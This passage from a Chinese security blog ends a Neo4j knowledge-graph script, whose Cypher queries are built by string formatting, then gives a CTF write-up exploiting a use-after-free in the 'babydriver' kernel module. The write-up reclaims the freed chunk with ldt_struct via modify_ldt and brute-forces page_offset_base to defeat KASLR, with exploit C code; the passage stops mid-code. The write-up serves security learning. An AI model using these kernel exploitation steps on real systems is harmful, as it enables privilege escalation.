class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:游戏数据库&#123;id:\&#x27;%d\&#x27;, name:\&#x27;%s\&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;游戏数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name.readlines()</span><br><span class="line">        time_list = self.time.readlines()</span><br><span class="line">        size_list = self.size.readlines()</span><br><span class="line">        language_list = self.language.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:游戏名称&#123;id:&#x27;%d&#x27;, 名称:&#x27;%s&#x27;, 语言:&#x27;%s&#x27;, 大小:&#x27;%s&#x27;, 发售时间:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),language_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       size_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),time_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tmp_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            content_list = self.content.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content_list)):</span><br><span class="line">                <span class="keyword">if</span> content_list[j] <span class="keyword">not</span> <span class="keyword">in</span> tmp_list:</span><br><span class="line">                    tmp_list.append(content_list[j])</span><br><span class="line">                    cql = <span class="string">&#x27;MERGE (:游戏标签&#123;标签:\&#x27;%s\&#x27;&#125;)&#x27;</span> % (content_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name.seek(<span class="number">0</span>)</span><br><span class="line">        self.time.seek(<span class="number">0</span>)</span><br><span class="line">        self.size.seek(<span class="number">0</span>)</span><br><span class="line">        self.language.seek(<span class="number">0</span>)</span><br><span class="line">        self.content.seek(<span class="number">0</span>)</span><br><span class="line">        name_list = self.name.readlines()</span><br><span class="line">        time_list = self.time.readlines()</span><br><span class="line">        size_list = self.size.readlines()</span><br><span class="line">        language_list = self.language.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            content_list = self.content.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:游戏名称&#123;id:&#x27;%d&#x27;, 名称:&#x27;%s&#x27;, 语言:&#x27;%s&#x27;, 大小:&#x27;%s&#x27;, 发售时间:&#x27;%s&#x27;&#125;),</span></span><br><span class="line"><span class="string">                          (b:游戏标签&#123;标签:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (a)-[:分类]-&gt;(b)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),language_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       size_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),time_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       content_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.content.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            content_list = self.content.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                     MATCH (:游戏名称&#123;id:&#x27;%d&#x27;&#125;)-[r:分类]-&gt;(:游戏标签&#123;标签:&#x27;%s&#x27;&#125;)  </span></span><br><span class="line"><span class="string">                     WITH count(r) as num,collect(r) as rel</span></span><br><span class="line"><span class="string">                     WHERE num &gt; 1</span></span><br><span class="line"><span class="string">                     UNWIND tail(rel) as rels</span></span><br><span class="line"><span class="string">                     DELETE rels</span></span><br><span class="line"><span class="string">                 &quot;&quot;&quot;</span> % (i,content_list[j])</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<p>最后到达的效果如下图：</p>
<img src="/2023/03/01/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%80/1677603194240.png" class width="1677603194240"> 
<ul>
<li>只放了部分（总共有：300 个 <code>游戏名称</code> 节点，70 个 <code>游戏标签</code> 节点，17527 个关系）</li>
</ul>
<p>个人感觉本项目在爬虫上下足了功夫，得到的虽然不是结构化的数据但非常好处理，于是省去了后续的 <strong>知识抽取 知识融合 知识验证</strong></p>
<p>目前还没有学习图神经网络，基于知识图谱的应用（专家系统、推荐系统、语义搜索、问答…）暂时无法完成，之后有机会进行补充</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/27/ldt_struct+modify_ldt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/27/ldt_struct+modify_ldt/" class="post-title-link" itemprop="url">ldt_struct+modify_ldt</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-27 19:30:56 / Modified: 19:34:30" itemprop="dateCreated datePublished" datetime="2023-02-27T19:30:56+08:00">2023-02-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babydriver</strong></p>
<p>先进行解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz </span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>rootfs.cpio</code> 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>伪条件竞争引发的 UAF 漏洞，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(fp, command);</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(arg, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = arg;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以再释放后再申请（改写大小）</li>
</ul>
<p>babydriver 是我们入门内核的第一道题目，现在来看看它的两个变种</p>
<p><strong>变种二：去除 Read 功能</strong>（变种一在上篇博客）</p>
<p>没有 Read，可以使用 <code>ldt_struct</code> 结构体来泄露内核基地址</p>
<ul>
<li>LDT 是局部段描述符表，里面存放的是进程的段描述符，段寄存器里存放的段选择子便是段描述符表中段描述符的索引</li>
<li>结构体 <code>ldt_struct</code> 就是用于描述局部段描述符表的</li>
</ul>
<p>在保护模式中，段寄存器存放的就是16的段选择子，然后通过段选择子的信息定位到 GDT/LDT 表</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[----[<span class="number">0</span><span class="number">-1</span>]-------[<span class="number">2</span>]------[<span class="number">3</span><span class="number">-15</span>]---]</span><br><span class="line">[请求特权级别RPL, 标识T1, 索引号Index]</span><br></pre></td></tr></table></figure>
<ul>
<li>Index：CPU 将索引号乘8再加上GDT或者LDT的基地址，就可以找到目标段描述符</li>
<li>TL：其值为“0”查找 GDT 表，其值为“1”查找 LDT 表</li>
<li>RPL：请求特权级别（可以用于判断当前代码是否处于内核态）</li>
</ul>
<p>结构体 <code>ldt_struct</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_entries;</span><br><span class="line">	<span class="keyword">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>该结构体大小为 0x10，从 <code>kmalloc-16</code> 中取 </li>
</ul>
<p>在局部段描述符表中有许多的段描述符，用 <code>desc_struct</code> 进行描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p>Linux 提供了 <code>modify_ldt</code> 系统调用，用于获取或修改当前进程的 LDT</p>
<ul>
<li>内核源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount); <span class="comment">/* 内核任意地址读 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>); <span class="comment">/* 分配新的ldt_struct结构体 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中我们可以利用的两个函数就是 <code>read_ldt</code> 和 <code>write_ldt</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>劫持 <code>mm-&gt;context.ldt-&gt;entries</code> 就可以实现任意读（<code>ldt_struct-&gt;entries</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">	old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">	new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">	error = -ENOMEM;</span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries); <span class="comment">/* 为新的ldt_struct分配空间 */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct ldt_struct *<span class="title">alloc_ldt_struct</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	new_ldt = kmalloc(<span class="keyword">sizeof</span>(struct ldt_struct), GFP_KERNEL);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>write_ldt</code> 中会调用 <code>alloc_ldt_struct</code>，然后执行一个 <code>kmalloc</code>（可以被 UAF 控制）</li>
</ul>
<p>利用 <code>modify_ldt</code> 泄露内核地址的思路如下：</p>
<ul>
<li>申请并释放有 UAF 的堆块</li>
<li>执行 <code>write_ldt</code>，使在 <code>alloc_ldt_struct</code> 中申请的 <code>ldt_struct</code> 填充 UAF 堆块</li>
<li>利用 UAF 控制 <code>ldt_struct-&gt;entries</code>，然后使用 <code>read_ldt</code> 把数据读到用户态</li>
</ul>
<p>在实际的利用中，只能在 <code>ldt_struct-&gt;entries</code> 中爆破数据</p>
<ul>
<li>命中无效的地址：<code>copy_to_user</code> 返回非 0 值，此时 <code>read_ldt</code> 的返回值便是 <code>-EFAULT</code></li>
<li>命中内核空间：<code>read_ldt</code> 执行成功</li>
</ul>
<p>但我们不能直接爆破内核基地址，只能先爆破线性映射区 <code>direct mapping area</code>（kmalloc 使用的空间），然后通过 <code>read_ldt</code> 在堆上读取一些可利用的内核指针并泄露内核基地址</p>
<ul>
<li>通常情况下内核会开启 <code>hardened usercopy</code> 保护，当 <code>copy_to_user</code> 的源地址为内核 <code>.text</code> 段（包括 <code>_stext</code> 和 <code>_etext</code>）时会引起 <code>kernel panic</code></li>
<li>一般情况下 <code>page_offset_base + 0x9d000</code> 处固定存放着 <code>secondary_startup_64</code> 函数的地址（<code>kernel_base = secondary_startup_64 - 0x40</code>）</li>
</ul>
<p>下面看一个爆破的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">fd[<span class="number">2</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">ioctl(fd[<span class="number">0</span>], <span class="number">0x10001</span>, <span class="number">0x10</span>);</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span>;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc)); <span class="comment">/* 填充UAF堆块 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) <span class="comment">/* 爆破page_offset_base */</span></span><br><span class="line">&#123;</span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;page_offset_base, <span class="number">8</span>);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found 